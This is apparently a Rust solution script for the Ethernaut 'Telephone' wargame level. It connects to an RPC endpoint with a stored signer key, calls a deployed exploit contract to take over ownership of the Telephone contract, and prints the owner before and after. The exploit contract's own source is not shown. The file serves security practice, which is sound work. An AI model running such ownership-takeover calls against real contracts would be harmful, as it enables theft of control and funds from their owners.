#[allow(unused_imports)]
use alloy::{
    network::TransactionBuilder,
    primitives::{
        address,
        utils::{format_ether, Unit},
        U256,
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol! {
    #[sol(rpc)]
    contract Telephone {
        function owner() public view returns (address);
    }
    
    #[sol(rpc)]
    contract Exploit {
        function exploit(address telephone, address owner) public;
    }
}

use crate::ethernaut;

use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level04_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level04())?;
    
    Ok(())
}

async fn level04() -> Result<(), Box<dyn std::error::Error>> {
    let signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    
    let provider = ProviderBuilder::new()
        .wallet(signer)
        .connect(ethernaut::RPC)
        .await?;
    
    let telephone_address = "0x331373d4bBe3393B6d1A8890F60c705744D34bfa";
    let telephone = Telephone::new(telephone_address.parse()?, provider.clone());
    let exploit_address = "0xDb293C4A8c1d8Ce0e91Fe53C665D95ce5a5eC643";
    let exploit = Exploit::new(exploit_address.parse()?, provider.clone());
    
    println!("[CHECK]");
    let owner = telephone.owner().call().await?;
    println!("[Telephone.onwer()]    Telephone.owner = {owner}");
    
    let exploit_tx = exploit
        .exploit(telephone_address.parse()?, ethernaut::ALICE.parse()?)
        .send()
        .await?;
    println!("[Exploit.exploit()]    Panding transaction... {}", exploit_tx.tx_hash());
    
    let exploit_receipt = exploit_tx
        .get_receipt()
        .await?;
    println!(
        "[Exploit.exploit()]    exploit included in block {}.\n",
        exploit_receipt.block_number.expect("Failed to get block number")
    );
    
    // Check
    println!("[CHECK]");
    let owner = telephone.owner().call().await?;
    println!("[Telephone.owner()]    Telephone's owner = {owner}");
    
    Ok(())
}
// Telephone: 0x331373d4bBe3393B6d1A8890F60c705744D34bfa
// Exploit: 0xDb293C4A8c1d8Ce0e91Fe53C665D95ce5a5eC643